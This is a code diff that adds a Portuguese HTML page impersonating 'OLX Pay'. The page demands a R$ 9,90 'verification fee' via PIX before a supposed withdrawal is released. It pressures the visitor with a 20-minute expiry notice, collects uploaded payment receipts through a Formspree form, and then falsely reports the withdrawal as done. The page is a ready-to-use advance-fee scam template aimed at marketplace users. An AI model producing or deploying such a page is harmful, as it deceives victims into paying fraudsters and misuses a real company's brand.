@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Taxa de Liberação de Saque - OLX Pay</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f3f3f3;
+      margin: 0;
+    }
+    .container {
+      max-width: 500px;
+      margin: auto;
+      padding: 20px;
+      background-color: white;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      border-radius: 10px;
+    }
+    h2, h3 {
+      color: #4b0082;
+    }
+    .aviso {
+      background-color: #fff4e6;
+      border-left: 5px solid #ff9900;
+      padding: 15px;
+      margin-bottom: 20px;
+      border-radius: 5px;
+      color: #333;
+    }
+    .pix-chave {
+      background-color: #e6e0f8;
+      padding: 10px;
+      border-radius: 5px;
+      word-wrap: break-word;
+      font-weight: bold;
+      color: #4b0082;
+      text-align: center;
+      user-select: all;
+      margin-bottom: 10px;
+    }
+    .copy-btn {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      background-color: #4b0082;
+      color: white;
+      text-align: center;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+    .copy-btn:hover {
+      background-color: #360061;
+    }
+    .validade {
+      color: red;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 15px;
+    }
+    form input, form button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 12px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    form button {
+      background-color: #ff9900;
+      color: white;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    form button:hover {
+      background-color: #e68a00;
+    }
+    #mensagemSucesso {
+      display: none;
+      background-color: #e0ffe0;
+      border: 1px solid #00a000;
+      color: #006600;
+      padding: 15px;
+      border-radius: 5px;
+      text-align: center;
+      margin-top: 20px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>⚠️ Etapa Obrigatória de Verificação – Taxa para Liberação de Saque</h2>
+
+    <div class="aviso">
+      <p>Para prosseguir com o saque, é necessário pagar uma taxa única de verificação.</p>
+      <p>Essa taxa serve para garantir a segurança e evitar fraudes.</p>
+    </div>
+
+    <h3>💲 Valor da Taxa:</h3>
+    <div class="pix-chave">
+      R$ 9,90
+    </div>
+
+    <h3>Chave PIX Copia e Cola:</h3>
+    <div class="pix-chave" id="pixChave">
+      SUA_CHAVE_PIX_AQUI
+    </div>
+    <button class="copy-btn" onclick="copiarPix()">Copiar Chave PIX</button>
+
+    <div class="validade">
+      Atenção: Esta chave expira em 20 minutos!
+    </div>
+
+    <h3>Envie o comprovante de pagamento:</h3>
+
+    <form id="formComprovante" enctype="multipart/form-data">
+      <input type="file" name="Comprovante" accept="image/*,application/pdf" required>
+      <button type="submit">Enviar Comprovante</button>
+    </form>
+
+    <div id="mensagemSucesso">✅ Saque realizado. Aguarde a confirmação!</div>
+  </div>
+
+  <script>
+    function copiarPix() {
+      const pixChave = document.getElementById("pixChave").innerText;
+      navigator.clipboard.writeText(pixChave).then(function() {
+        alert("Chave PIX copiada!");
+      }, function() {
+        alert("Erro ao copiar. Copie manualmente.");
+      });
+    }
+
+    document.getElementById('formComprovante').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(this);
+
+      try {
+        await fetch('https://formspree.io/f/mpwrjzzv', {
+          method: 'POST',
+          body: formData,
+          headers: { 'Accept': 'application/json' }
+        });
+
+        // Oculta o formulário
+        this.style.display = 'none';
+        // Exibe a mensagem de sucesso
+        document.getElementById('mensagemSucesso').style.display = 'block';
+
+      } catch (error) {
+        alert('Erro ao enviar. Tente novamente.');
+      }
+    });
+  </script>
+
+</body>
+</html>
